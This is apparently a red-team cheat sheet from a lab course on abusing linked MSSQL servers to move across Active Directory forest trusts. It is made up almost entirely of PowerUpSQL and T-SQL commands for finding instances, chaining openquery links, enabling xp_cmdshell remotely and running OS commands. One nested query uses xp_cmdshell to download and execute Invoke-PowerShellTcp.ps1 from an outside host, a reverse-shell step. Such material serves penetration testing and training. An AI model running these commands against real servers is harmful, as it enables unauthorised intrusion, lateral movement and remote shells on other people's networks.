# Cross Forest Attacks - MSSQL Servers

- [Cross Forest Attacks - MSSQL Servers](#cross-forest-attacks---mssql-servers)
  - [MSSQL Servers](#mssql-servers)
  - [Enumeration](#enumeration)
  - [Database links](#database-links)
  - [Searching Database Links](#searching-database-links)
  - [Executing Commands](#executing-commands)
  - [Abusing Database Links](#abusing-database-links)

---

## MSSQL Servers

MS SQL servers are generally deployed in plenty in a Windows domain. MSSQL Servers provide very good options for lateral movement as they **allow mapping domain users to database roles** and thus become part of AD trusts.

Let's see one scenario where we can abuse SQL servers trust and database links to move across forest trust boundaries. For MSSQL and PowerShell hackery, lets use **PowerUpSQL**:

- https://github.com/NetSPI/PowerUpSQL

```
. C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.ps1
```

<br/>

---

## Enumeration

<br/>

To discover MSSQL instances:

```
Get-SQLInstanceDomain
```

<br/>

To check accessibility:

```
Get-SQLConnectionTestThreaded
```

```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```

<br/>

Gather information about the MSSQL instances:

```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

<br/>

---

## Database links

A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources. 

In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.

Database links work even across forest trusts.

<br/>

---

## Searching Database Links

Look for links to remote servers:

```
Get-SQLServerLink -Instance us-mssql.us.techcorp.local -Verbose
```

Note we can also enuemrate linked servers manually:

```
select * from master..sysservers
```

<br/>

`Openquery` function can be used to run queries on a linked database:

```
select * from openquery("192.168.23.25",'select * from master..sysservers')
```

`Openquery` queries can be chained to access links within links (nested links)

```
select * from openquery("192.168.23.25 ",'select * from openquery("db-sqlsrv",''select @@version as version'')')
```

<br/>

---

## Executing Commands

On the target server, either `xp_cmdshell` should be already enabled; or if `rpcout` is enabled (**disabled by default**), `xp_cmdshell` can be enabled using:

```
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "db-sqlsrv"
```

<br/>

From the initial SQL server, OS commands can be executed using nested link queries:

```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version; exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.64/Invoke-PowerShellTcp.ps1'''')"'')')
```

<br/>

---

## Abusing Database Links

Crawling links to remote servers:

```
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local
```

<br/>

Abusing links to remote servers (tries to use `xp_cmdshell` on every link of the chain):

```
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -Query 'exec master..xp_cmdshell ''whoami'''
```

You can also use `-QueryTarget` to execute commands only on certain server:

```
Get-SQLServerLinkCrawl -Instance us-mssql.us.techcorp.local -QueryTarget DB-SQLSRV -Query 'exec master..xp_cmdshell ''whoami''' 
```

---